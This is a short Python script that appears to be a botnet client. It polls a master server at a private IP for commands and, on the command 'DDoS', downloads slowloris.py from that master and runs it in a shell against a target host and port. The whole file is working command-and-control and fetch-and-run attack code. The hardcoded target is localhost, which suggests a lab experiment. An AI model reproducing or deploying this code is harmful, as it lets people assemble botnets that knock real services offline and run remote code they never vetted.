from flask import Flask
from subprocess import Popen, PIPE
import requests
import time
import shutil

MASTER_IP = "192.168.0.100"
MASTER_PORT = "5000"


def get_command():
    command = requests.get("http://" + MASTER_IP + ":" + MASTER_PORT + "/get_command")
    print("Command is:", command.content.decode('ascii'))
    return command.content.decode('ascii')

def get_script():
    while 1:
        try:
            r = requests.get("http://" + MASTER_IP + ":" + MASTER_PORT + "/get_script", stream=True)
            with open('slowloris.py', 'wb') as out_file:
                shutil.copyfileobj(r.raw, out_file)
            return
        except Exception:
            print("Error getting script from master")
            continue
def launchDDoS():
    proc = Popen("python3 slowloris.py -i 127.0.0.1 -p 8989 -s 30", \
        shell=True, stdin=PIPE, stdout=PIPE \
        , stderr=PIPE)
    out, err = proc.communicate()
    print(out)

steps = {
    "DDoS": (get_script, launchDDoS),
    "Standby": ()
}

def run():
    while True:
        command  =  get_command()
        if str(command) not in steps:
            continue
        else:
            for step in steps[command]:
                print("Gi")
                step()
            time.sleep(100)

if __name__ == "__main__":
    run()